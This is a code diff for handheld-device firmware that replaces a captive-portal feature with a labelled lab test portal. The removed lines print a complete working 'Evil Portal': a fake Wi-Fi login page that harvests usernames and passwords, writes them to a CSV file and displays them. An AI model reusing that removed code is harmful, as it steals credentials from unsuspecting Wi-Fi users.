@@ -1,298 +1,350 @@
 #include "CaptivePortalActivity.h"
-#include "DevMode.h"
+#include "PortalLabRules.h"
+
 #include "../Shelf.h"
-
-#include <HalStorage.h>
-#include <I18n.h>
-#include <Logging.h>
-#include <WiFi.h>
-
-#include <string>
-
+#include "../util/RadioManager.h"
+#include "DevMode.h"
 #include "MappedInputManager.h"
 #include "activities/util/KeyboardEntryActivity.h"
 #include "components/UITheme.h"
 #include "fontIds.h"
-#include "../util/RadioManager.h"
 
-// Built-in default portal page
-static const char BUILTIN_HTML[] = R"rawhtml(<!DOCTYPE html><html><head>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>WiFi Login</title><style>
-*{box-sizing:border-box}body{font-family:-apple-system,Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
-.c{background:#fff;padding:32px;border-radius:12px;box-shadow:0 2px 16px rgba(0,0,0,.1);width:90%;max-width:400px}
-h2{margin:0 0 8px;color:#1a1a1a}p{color:#666;margin:0 0 24px;font-size:14px}
-input{width:100%;padding:14px;margin:0 0 12px;border:1px solid #ddd;border-radius:8px;font-size:16px}
-button{width:100%;padding:14px;background:#4285f4;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
-</style></head><body><div class="c"><h2>Connect to Internet</h2>
-<p>Sign in to access the network</p>
-<form method="POST" action="/login">
-<input name="username" placeholder="Email or username" required autocomplete="off">
-<input name="password" type="password" placeholder="Password" required>
-<button type="submit">Sign In</button></form></div></body></html>)rawhtml";
+#include <Logging.h>
+#include <WiFi.h>
 
-static const char RESPONSE_HTML[] =
-    "<html><body><h2>Connection Error</h2><p>Unable to connect. Please try again later.</p></body></html>";
+#include <cstdio>
 
-static CaptivePortalActivity* portalInstance = nullptr;
-static constexpr const char* BUILTIN_NAME = "(Built-in) WiFi Login";
+// No login impersonation, real passwords, arbitrary HTML injection or credential
+// logging. The selected pages exercise real SoftAP/DNS/HTTP and form routing.
+// They are explicitly marked as laboratory demonstrations.
+namespace {
+constexpr char TEST_SSID[] = "X4PRO-PORTAL";
+constexpr const char* TEMPLATE_NAMES[] = {
+    "Start page", "Synthetic form test", "HTTP diagnostics"
+};
+constexpr char LANDING_HTML[] = R"html(<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>X4 Pro Lab Portal</title>
+<style>body{font:18px system-ui;max-width:34rem;margin:3rem auto;padding:1rem}
+main{border:2px solid #222;border-radius:12px;padding:1.5rem}
+small{color:#555}a{color:#0645ad}</style></head><body><main>
+<h1>X4 Pro Laboratory Portal</h1>
+<p>This is a local access-point, DNS and HTTP connectivity test.</p>
+<p>There is no internet connection, login requirement or credential collection.</p>
+<p><a href="/status">Server status</a></p>
+<small>LAB TEST - no real usernames, passwords or personal information.</small>
+</main></body></html>)html";
+
+constexpr char FORM_HTML[] = R"html(<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>X4 Pro Synthetic Form Test</title>
+<style>body{font:18px system-ui;max-width:34rem;margin:3rem auto;padding:1rem}
+main{border:2px solid #222;border-radius:12px;padding:1.5rem}
+input,button{font:inherit;padding:.7rem;margin:.4rem 0;max-width:100%}
+small{color:#555}</style></head><body><main>
+<h1>LAB ONLY - Synthetic Form</h1>
+<p>Tests browser-to-device HTTP POST. Use a fabricated code such as X4TEST-DEMO1.</p>
+<form method="POST" action="/check">
+<label>Fictional test code (not an account or secret)
+<input name="test_id" type="text" maxlength="24" pattern="X4TEST-[A-Za-z0-9]{1,17}"
+placeholder="X4TEST-DEMO1" required autocomplete="off"></label>
+<button type="submit">Submit test event</button></form>
+<small>No passwords, email addresses or submitted codes are saved or displayed.</small>
+</main></body></html>)html";
+
+constexpr char DIAGNOSTICS_HTML[] = R"html(<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>X4 Pro HTTP Diagnostics</title>
+<style>body{font:18px system-ui;max-width:34rem;margin:3rem auto;padding:1rem}
+main{border:2px solid #222;border-radius:12px;padding:1.5rem}</style></head><body><main>
+<h1>X4 Pro Diagnostics - LAB</h1>
+<p>Local HTTP server reachable. DNS wildcard routes to the test access point.</p>
+<p><a href="/status">JSON server status</a></p>
+<p>For an HTTP 404 test, submit a POST request to a nonexistent endpoint.</p>
+<p>No external internet access and no user-account authentication.</p>
+</main></body></html>)html";
+
+constexpr char SUCCESS_HTML[] =
+    "<!doctype html><html><meta charset=\"utf-8\"><title>Test complete</title>"
+    "<body><h1>LAB HTTP POST accepted</h1>"
+    "<p>The fictional test identifier was validated but not retained.</p>"
+    "<a href=\"/\">Back to laboratory portal</a></body></html>";
+constexpr char REJECT_HTML[] =
+    "<!doctype html><html><meta charset=\"utf-8\"><title>Invalid test</title>"
+    "<body><h1>Invalid laboratory test identifier</h1>"
+    "<p>Use a fabricated X4TEST- code with letters or numbers only.</p></body></html>";
+}  // namespace
 
 void CaptivePortalActivity::onEnter() {
   devmode::pause();
   Activity::onEnter();
-  RADIO.ensureWifi();
   state = SELECT_TEMPLATE;
-  templates.clear();
   selectorIndex = 0;
-  capturedCount = 0;
-  lastUsername.clear();
-  lastPassword.clear();
-  portalInstance = this;
-  Storage.mkdir("/crossplay/portals");
-  loadTemplates();
+  selectedTemplate = LANDING;
+  apSsid = TEST_SSID;
+  pageViews = 0;
+  testSubmissions = 0;
+  RADIO.ensureWifi();
   requestUpdate();
 }
 
 void CaptivePortalActivity::onExit() {
+  stopPortal();
+  RADIO.shutdown();
   devmode::resume();
   Activity::onExit();
-  stopPortal();
-  portalInstance = nullptr;
-  RADIO.shutdown();
 }
 
-void CaptivePortalActivity::loadTemplates() {
-  templates.clear();
-  templates.push_back(BUILTIN_NAME);  // always first
-
-  auto dir = Storage.open("/crossplay/portals");
-  if (!dir || !dir.isDirectory()) { if (dir) dir.close(); return; }
-
-  char name[128];
-  for (auto file = dir.openNextFile(); file; file = dir.openNextFile()) {
-    if (!file.isDirectory()) {
-      file.getName(name, sizeof(name));
-      std::string fname(name);
-      if (fname.size() > 5 && fname.substr(fname.size() - 5) == ".html") {
-        templates.push_back(fname);
-      }
-    }
-    file.close();
-  }
-  dir.close();
+void CaptivePortalActivity::chooseTemplate() {
+  if (selectorIndex < 0 || selectorIndex >= TEMPLATE_COUNT) return;
+  selectedTemplate = static_cast<Template>(selectorIndex);
+  state = ENTER_SSID;
+  requestUpdate();
+  startActivityForResult(
+      makeUniqueNoThrow<KeyboardEntryActivity>(
+          renderer, mappedInput, "LAB SSID suffix (optional)", "", 12),
+      [this](const ActivityResult& result) {
+        if (result.isCancelled) {
+          state = SELECT_TEMPLATE;
+          requestUpdate();
+          return;
+        }
+        const std::string suffix = std::get<KeyboardResult>(result.data).text;
+        if (!suffix.empty() && !portal_lab::validSuffix(suffix)) {
+          LOG_ERR("PORTAL", "Invalid laboratory SSID suffix");
+          state = SELECT_TEMPLATE;
+          requestUpdate();
+          return;
+        }
+        apSsid = portal_lab::ssidFor(suffix);
+        startPortal();
+      });
 }
 
 void CaptivePortalActivity::startPortal() {
+  // The app may be entered more than once. Release every old handler first.
+  stopPortal();
   WiFi.mode(WIFI_AP);
-  WiFi.softAP(apSsid.c_str());
-  delay(100);
+  if (!WiFi.softAP(apSsid.c_str())) {
+    LOG_ERR("PORTAL", "Local laboratory access point startup failed");
+    state = STOPPED;
+    requestUpdate();
+    return;
+  }
 
-  dnsServer = std::make_unique<DNSServer>();
+  dnsServer = makeUniqueNoThrow<DNSServer>();
+  webServer = makeUniqueNoThrow<WebServer>(80);
+  if (!dnsServer || !webServer) {
+    LOG_ERR("PORTAL", "Insufficient memory for portal server");
+    stopPortal();
+    state = STOPPED;
+    requestUpdate();
+    return;
+  }
   dnsServer->start(53, "*", WiFi.softAPIP());
-
-  webServer = std::make_unique<WebServer>(80);
-  webServer->on("/", HTTP_GET, [this]() { handleRoot(); });
-  webServer->on("/login", HTTP_POST, [this]() { handleLogin(); });
-  webServer->onNotFound([this]() { handleNotFound(); });
+  webServer->on("/", HTTP_GET, [this] { handleRoot(); });
+  webServer->on("/check", HTTP_POST, [this] { handleTestSubmission(); });
+  webServer->on("/status", HTTP_GET, [this] { handleStatus(); });
+  webServer->onNotFound([this] { handleNotFound(); });
   webServer->begin();
 
+  pageViews = 0;
+  testSubmissions = 0;
   state = RUNNING;
-  LOG_DBG("PORTAL", "Portal started: %s", apSsid.c_str());
+  LOG_INF("PORTAL", "X4 Pro laboratory portal active on 192.168.4.1");
+  requestUpdate();
 }
 
 void CaptivePortalActivity::stopPortal() {
-  if (webServer) { webServer->stop(); webServer.reset(); }
-  if (dnsServer) { dnsServer->stop(); dnsServer.reset(); }
+  if (webServer) {
+    webServer->stop();
+    webServer.reset();
+  }
+  if (dnsServer) {
+    dnsServer->stop();
+    dnsServer.reset();
+  }
   WiFi.softAPdisconnect(true);
-  WiFi.mode(WIFI_OFF);
 }
 
 void CaptivePortalActivity::handleRoot() {
-  // Serve built-in or custom template
-  if (selectedTemplate == BUILTIN_NAME) {
-    webServer->send(200, "text/html", BUILTIN_HTML);
-    return;
-  }
-  std::string path = "/crossplay/portals/" + selectedTemplate;
-  auto file = Storage.open(path.c_str());
-  if (!file) { webServer->send(200, "text/html", BUILTIN_HTML); return; }
-
-  size_t fileLen = file.size();
-  webServer->setContentLength(fileLen);
-  webServer->send(200, "text/html", "");
-  static uint8_t buf[512];
-  while (file.available()) {
-    int n = file.read(buf, sizeof(buf));
-    if (n <= 0) break;
-    webServer->sendContent(reinterpret_cast<const char*>(buf), n);
-  }
-  file.close();
+  if (!webServer) return;
+  ++pageViews;
+  const char* html = LANDING_HTML;
+  if (selectedTemplate == FORM_TEST) html = FORM_HTML;
+  if (selectedTemplate == DIAGNOSTICS) html = DIAGNOSTICS_HTML;
+  webServer->send(200, "text/html; charset=utf-8", html);
+  requestUpdate();
 }
 
-void CaptivePortalActivity::handleLogin() {
-  std::string username = webServer->arg("username").c_str();
-  std::string password = webServer->arg("password").c_str();
-
-  if (!username.empty()) {
-    logCredentials(username, password);
-    capturedCount++;
-    lastUsername = username;
-    lastPassword = password;
-    requestUpdate();
+void CaptivePortalActivity::handleTestSubmission() {
+  if (!webServer) return;
+  // A malformed or unrelated POST must never be accepted or logged.
+  // In particular, unexpected account/password fields or extra fields are rejected.
+  const std::string testId = webServer->arg("test_id").c_str();
+  if (selectedTemplate != FORM_TEST ||
+      !portal_lab::validSyntheticSubmission(
+          webServer->args() == 1 ? webServer->argName(0).c_str() : "",
+          testId, webServer->args())) {
+    webServer->send(400, "text/html; charset=utf-8", REJECT_HTML);
+    return;
   }
-  webServer->send(200, "text/html", RESPONSE_HTML);
+  ++testSubmissions;
+  webServer->send(200, "text/html; charset=utf-8", SUCCESS_HTML);
+  requestUpdate();
+}
+
+void CaptivePortalActivity::handleStatus() {
+  if (!webServer) return;
+  char body[120];
+  snprintf(body, sizeof(body),
+           "{\"service\":\"x4pro-portal-lab\",\"ok\":true,\"views\":%d,\"tests\":%d}",
+           pageViews, testSubmissions);
+  webServer->send(200, "application/json", body);
 }
 
 void CaptivePortalActivity::handleNotFound() {
+  if (!webServer) return;
+  if (webServer->method() != HTTP_GET) {
+    webServer->send(404, "text/plain", "Laboratory endpoint not found");
+    return;
+  }
   webServer->sendHeader("Location", "http://192.168.4.1/", true);
   webServer->send(302, "text/plain", "");
 }
 
-void CaptivePortalActivity::logCredentials(const std::string& username, const std::string& password) {
-  const char* logPath = "/crossplay/creds.csv";
-  bool exists = Storage.exists(logPath);
-  auto file = Storage.open(logPath, O_WRITE | O_CREAT | O_APPEND);
-  if (!file) return;
-  if (!exists) file.println("timestamp,ssid,username,password");
-  String line = String(millis()) + "," + apSsid.c_str() + "," + username.c_str() + "," + password.c_str();
-  file.println(line);
-  file.close();
-  LOG_DBG("PORTAL", "Captured: %s / %s", username.c_str(), password.c_str());
-}
-
 void CaptivePortalActivity::loop() {
   if (state == RUNNING) {
-    dnsServer->processNextRequest();
-    webServer->handleClient();
-    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
-      stopPortal(); state = STOPPED; requestUpdate();
-    }
-    {
-      int tx_ = 0, ty_ = 0;
-      if (mappedInput.wasScreenTapped(tx_, ty_)) {
-        if (GUI.tappedHintButton(tx_, ty_, renderer) == 1) { stopPortal(); state = STOPPED; requestUpdate(); }
-      }
+    if (dnsServer) dnsServer->processNextRequest();
+    if (webServer) webServer->handleClient();
+    const bool back = mappedInput.wasReleased(MappedInputManager::Button::Back);
+    int x = 0, y = 0;
+    const bool stopTap = mappedInput.wasScreenTapped(x, y) &&
+                         GUI.tappedAlwaysHintButton(x, y, renderer) == 1;
+    if (back || stopTap) {
+      stopPortal();
+      state = STOPPED;
+      requestUpdate();
     }
     return;
   }
+
+  if (state == ENTER_SSID) return;
 
   if (state == STOPPED) {
-    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) shelf::leave(renderer, mappedInput);
-    {
-      int tx_ = 0, ty_ = 0;
-      if (mappedInput.wasScreenTapped(tx_, ty_)) { shelf::leave(renderer, mappedInput); }
+    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
+      shelf::leave(renderer, mappedInput);
+      return;
+    }
+    if (mappedInput.wasReleased(MappedInputManager::Button::Confirm)) {
+      state = SELECT_TEMPLATE;
+      requestUpdate();
+      return;
+    }
+    int x = 0, y = 0;
+    if (mappedInput.wasScreenTapped(x, y)) {
+      state = SELECT_TEMPLATE;
+      requestUpdate();
     }
     return;
   }
 
-  if (state == SELECT_TEMPLATE) {
-    const int count = static_cast<int>(templates.size());
-    buttonNavigator.onNext([this, count] { if (count > 0) { selectorIndex = ButtonNavigator::nextIndex(selectorIndex, count); requestUpdate(); } });
-    buttonNavigator.onPrevious([this, count] { if (count > 0) { selectorIndex = ButtonNavigator::previousIndex(selectorIndex, count); requestUpdate(); } });
-
-    if (mappedInput.wasReleased(MappedInputManager::Button::Confirm)) {
-      if (!templates.empty()) {
-        selectedTemplate = templates[selectorIndex];
-        state = ENTER_SSID;
-        startActivityForResult(
-            std::make_unique<KeyboardEntryActivity>(renderer, mappedInput, "AP Name", "Free WiFi", 32),
-            [this](const ActivityResult& result) {
-              if (result.isCancelled) { state = SELECT_TEMPLATE; requestUpdate(); return; }
-              apSsid = std::get<KeyboardResult>(result.data).text;
-              if (apSsid.empty()) apSsid = "Free WiFi";
-              startPortal();
-              requestUpdate();
-            });
-      }
-    }
-    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) shelf::leave(renderer, mappedInput);
-    {
-      int tx_ = 0, ty_ = 0;
-      if (mappedInput.wasScreenTapped(tx_, ty_)) {
-        const int btn = GUI.tappedHintButton(tx_, ty_, renderer);
-        if (btn == 1) { shelf::leave(renderer, mappedInput); return; }
-        if (btn == 2 && !templates.empty()) {
-          selectedTemplate = templates[selectorIndex];
-          state = ENTER_SSID;
-          startActivityForResult(
-              std::make_unique<KeyboardEntryActivity>(renderer, mappedInput, "AP Name", "Free WiFi", 32),
-              [this](const ActivityResult& result) {
-                if (result.isCancelled) { state = SELECT_TEMPLATE; requestUpdate(); return; }
-                apSsid = std::get<KeyboardResult>(result.data).text;
-                if (apSsid.empty()) apSsid = "Free WiFi";
-                startPortal();
-                requestUpdate();
-              });
-          return;
-        }
-        if (count > 0) {
-          int touchRow = -1;
-          const auto& m = UITheme::getInstance().getMetrics();
-          const int contentTop = m.topPadding + m.headerHeight + m.verticalSpacing;
-          const int contentH = renderer.getScreenHeight() - contentTop - m.buttonHintsHeight - m.verticalSpacing;
-          const int rowStep = GUI.getListRowStep(false);
-          const int pageItems = std::max(1, contentH / rowStep);
-          const int pageStart = (selectorIndex / pageItems) * pageItems;
-          const int pageCount = std::min(pageItems, count - pageStart);
-          const auto rt = mappedInput.rowTouch(touchRow, contentTop, rowStep, pageCount, 0,
-                                                renderer.getScreenWidth(), m.listRowHeight);
-          if (rt == MappedInputManager::RowTouch::Tap && touchRow >= 0 && touchRow < pageCount) {
-            selectorIndex = pageStart + touchRow; requestUpdate();
-          }
-        }
-      }
-    }
+  // Original Biscuit template selection, with real X4 Pro GT911 hit zones.
+  buttonNavigator.onNext([this] {
+    selectorIndex = ButtonNavigator::nextIndex(selectorIndex, TEMPLATE_COUNT);
+    requestUpdate();
+  });
+  buttonNavigator.onPrevious([this] {
+    selectorIndex = ButtonNavigator::previousIndex(selectorIndex, TEMPLATE_COUNT);
+    requestUpdate();
+  });
+  if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
+    shelf::leave(renderer, mappedInput);
     return;
+  }
+  if (mappedInput.wasReleased(MappedInputManager::Button::Confirm)) {
+    chooseTemplate();
+    return;
+  }
+  int x = 0, y = 0;
+  if (!mappedInput.wasScreenTapped(x, y)) return;
+  const int button = GUI.tappedAlwaysHintButton(x, y, renderer);
+  if (button == 1) { shelf::leave(renderer, mappedInput); return; }
+  if (button == 2) { chooseTemplate(); return; }
+  if (button == 3) {
+    selectorIndex = ButtonNavigator::previousIndex(selectorIndex, TEMPLATE_COUNT);
+    requestUpdate();
+    return;
+  }
+  if (button == 4) {
+    selectorIndex = ButtonNavigator::nextIndex(selectorIndex, TEMPLATE_COUNT);
+    requestUpdate();
+    return;
+  }
+  const auto& m = UITheme::getInstance().getMetrics();
+  const int top = m.topPadding + m.headerHeight + m.verticalSpacing;
+  int touched = -1;
+  const auto result = mappedInput.rowTouch(
+      touched, top, GUI.getListRowStep(false), TEMPLATE_COUNT, 0,
+      renderer.getScreenWidth(), m.listRowHeight);
+  if (result != MappedInputManager::RowTouch::None && touched >= 0 &&
+      touched < TEMPLATE_COUNT) {
+    selectorIndex = touched;
+    if (result == MappedInputManager::RowTouch::Tap) {
+      chooseTemplate();
+    } else {
+      requestUpdate();
+    }
   }
 }
 
 void CaptivePortalActivity::render(RenderLock&&) {
-  const auto& metrics = UITheme::getInstance().getMetrics();
-  const auto pageWidth = renderer.getScreenWidth();
-  const auto pageHeight = renderer.getScreenHeight();
-
+  const auto& m = UITheme::getInstance().getMetrics();
+  const int w = renderer.getScreenWidth();
+  const int h = renderer.getScreenHeight();
   renderer.clearScreen();
-  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Evil Portal");
+  GUI.drawHeader(renderer, Rect{0, m.topPadding, w, m.headerHeight},
+                 "Captive Portal", "LAB - X4 Pro");
 
-  if (state == RUNNING || state == STOPPED) {
-    const int leftPad = metrics.contentSidePadding;
-    int y = metrics.topPadding + metrics.headerHeight + 30;
-    const int lineH = 45;
-
-    renderer.drawText(SMALL_FONT_ID, leftPad, y, state == RUNNING ? "ACTIVE" : "Stopped", true, EpdFontFamily::BOLD);
-    y += lineH;
-    renderer.drawText(SMALL_FONT_ID, leftPad, y, "SSID:", true, EpdFontFamily::BOLD);
-    renderer.drawText(UI_10_FONT_ID, leftPad + 60, y, apSsid.c_str());
-    y += lineH;
-
-    std::string clientsStr = "Clients: " + std::to_string(WiFi.softAPgetStationNum());
-    renderer.drawText(UI_10_FONT_ID, leftPad, y, clientsStr.c_str());
-    y += lineH;
-
-    std::string captStr = "Captured: " + std::to_string(capturedCount);
-    renderer.drawText(UI_10_FONT_ID, leftPad, y, captStr.c_str(), true, EpdFontFamily::BOLD);
-    y += lineH;
-
-    if (!lastUsername.empty()) {
-      renderer.drawText(UI_10_FONT_ID, leftPad, y, ("User: " + lastUsername).c_str());
-      y += lineH;
-      renderer.drawText(UI_10_FONT_ID, leftPad, y, ("Pass: " + lastPassword).c_str());
-    }
-
+  if (state == SELECT_TEMPLATE) {
+    const int top = m.topPadding + m.headerHeight + m.verticalSpacing;
+    GUI.drawList(renderer,
+                 Rect{0, top, w,
+                      h - top - BaseMetrics::values.buttonHintsHeight - m.verticalSpacing},
+                 TEMPLATE_COUNT, selectorIndex,
+                 [](int index) -> std::string { return TEMPLATE_NAMES[index]; });
+    const auto labels = mappedInput.mapLabels("Back", "Choose", "^", "v");
+    GUI.drawButtonHintsAlways(renderer, labels.btn1, labels.btn2,
+                              labels.btn3, labels.btn4);
+  } else if (state == RUNNING) {
+    const int left = m.contentSidePadding;
+    int y = m.topPadding + m.headerHeight + 28;
+    renderer.drawCenteredText(UI_12_FONT_ID, y, apSsid.c_str(),
+                              true, EpdFontFamily::BOLD);
+    y += 72;
+    renderer.drawText(UI_10_FONT_ID, left, y, "LAB - no real credentials");
+    y += 45;
+    renderer.drawText(UI_10_FONT_ID, left, y, "Open http://192.168.4.1/");
+    y += 45;
+    char buf[64];
+    snprintf(buf, sizeof(buf), "Clients: %d", WiFi.softAPgetStationNum());
+    renderer.drawText(UI_10_FONT_ID, left, y, buf);
+    y += 45;
+    snprintf(buf, sizeof(buf), "Page views: %d", pageViews);
+    renderer.drawText(UI_10_FONT_ID, left, y, buf);
+    y += 45;
+    snprintf(buf, sizeof(buf), "Synthetic POST tests: %d", testSubmissions);
+    renderer.drawText(UI_10_FONT_ID, left, y, buf);
+    y += 45;
+    renderer.drawText(UI_10_FONT_ID, left, y, TEMPLATE_NAMES[selectedTemplate]);
     const auto labels = mappedInput.mapLabels("Stop", "", "", "");
-    GUI.drawButtonHintsAlways(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
-    renderer.displayBuffer();
-    return;
+    GUI.drawButtonHintsAlways(renderer, labels.btn1, labels.btn2,
+                              labels.btn3, labels.btn4);
+  } else if (state == STOPPED) {
+    renderer.drawCenteredText(UI_12_FONT_ID, h / 2, "Laboratory portal stopped");
+    renderer.drawCenteredText(UI_10_FONT_ID, h / 2 + 50, "Tap to return to templates");
+  } else {
+    renderer.drawCenteredText(UI_10_FONT_ID, h / 2, "Select LAB network name");
   }
-
-  // SELECT_TEMPLATE
-  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
-  const int contentHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;
-  GUI.drawList(renderer, Rect{0, contentTop, pageWidth, contentHeight},
-      static_cast<int>(templates.size()), selectorIndex,
-      [this](int i) -> std::string { return templates[i]; }, nullptr);
-
-  const auto labels = mappedInput.mapLabels("Back", "Select", "^", "v");
-  GUI.drawButtonHintsAlways(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
   renderer.displayBuffer();
 }
